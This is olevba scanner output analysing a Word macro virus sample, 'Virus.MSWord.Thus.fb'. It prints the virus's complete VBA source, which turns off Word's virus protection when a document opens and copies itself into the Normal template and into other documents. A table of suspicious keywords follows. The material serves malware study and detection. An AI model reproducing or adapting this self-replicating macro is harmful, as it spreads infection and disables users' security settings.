olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Please do NOT modify this file !
Private Sub Document_Open()
On Error Resume Next

Options.VirusProtection = False

Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule

Dim mark As String
mark = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1)
If mark = "'Please do NOT modify this file !" Then

 ad.DeleteLines 1, ad.CountOfLines
 ad.InsertLines 1, nt.Lines(1, nt.CountOfLines)
 
Else
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, nt.CountOfLines
nt.InsertLines 1, "'Please do NOT modify this file !"
nt.InsertLines 2, ad.Lines(2, ad.CountOfLines)

If Day(Now) = 12 Then MsgBox "It's TOO much violence in this world!" & Chr(10) & Chr(13) & "Have MOT to stop it!", vbCritical, "I say:"

NormalTemplate.Save
ActiveDocument.Save
ThisDocument.Save


' [MOT] (C) Dr.Copy 1999

End If




End Sub




















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

